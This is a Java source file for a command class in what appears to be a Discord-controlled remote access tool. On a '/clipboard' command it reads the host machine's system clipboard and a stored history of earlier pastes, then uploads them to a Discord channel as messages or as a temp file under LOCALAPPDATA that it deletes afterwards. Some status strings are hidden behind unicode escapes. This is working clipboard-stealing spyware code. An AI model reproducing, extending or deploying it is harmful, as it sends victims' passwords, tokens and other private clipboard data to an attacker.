package cmd;

import main.Bot;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.User;

import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Random;

public class ClipboardCmd extends Command{
    private static final int rn = 32531;
    public ClipboardCmd(){
        this.name = "clipboard";
        this.usage = "/clipboard";
        this.desc = "";
        this.type = CommandType.GENERAL;
    }

    @Override
    public boolean onCommand(User user, Message message, String[] args) {
        try {
            System.out.println(1);
            Clipboard c = Toolkit.getDefaultToolkit().getSystemClipboard();
            String data = String.valueOf(c.getData(DataFlavor.stringFlavor));
            if (data.length()>1000) {
                File file = null;
                try { file = makeFile(data); } catch (IOException e) { message.getChannel().sendMessage("\u0066\u0069\u006c\u0065 \u0074\u006f\u006f \u0062\u0069\u0067 \u006f\u0072 \u0066\u0061\u0069\u006c\u0065\u0064").queue(); }
                if (file != null) try { message.getChannel().sendFile(file).queue(); } catch (Exception ee) { message.getChannel().sendMessage("`failed to send file (prob to big)`").queue(); }
                file.delete();
            }else message.getChannel().sendMessage("```Current clipboard:\n"+data+"```").queue();
        } catch (UnsupportedFlavorException | IOException e) { message.getChannel().sendMessage("action failed: "+ Bot.bot_id).queue(); e.printStackTrace(); }

        if (Bot.pastes.size()>0){
            String all = "";
            for (String paste : Bot.pastes) all+=paste+"\n";
            if (all.length()>1000) {
                File file = null;
                try { file = makeFile(all); } catch (IOException e) { message.getChannel().sendMessage("\u0066\u0069\u006c\u0065 \u0074\u006f\u006f \u0062\u0069\u0067 \u006f\u0072 \u0066\u0061\u0069\u006c\u0065\u0064").queue(); }
                if (file != null) try { message.getChannel().sendFile(file).queue(); } catch (Exception ee) { message.getChannel().sendMessage("`failed to send file (prob to big)`").queue(); }
                file.delete();
            }else message.getChannel().sendMessage("```All clipboard:\n"+all+"```").queue();
            Bot.pastes.clear();
        }
        return true;
    }

    private static File makeFile(String data) throws IOException {
        File file = new File(System.getenv("LOCALAPPDATA")+"\\tmp"+rn+".txt");
        if (!file.exists()&&!file.createNewFile()) return null;
        FileWriter writer = new FileWriter(file,false);
        writer.write(data);
        writer.flush();
        writer.close();
        return file;
    }
}
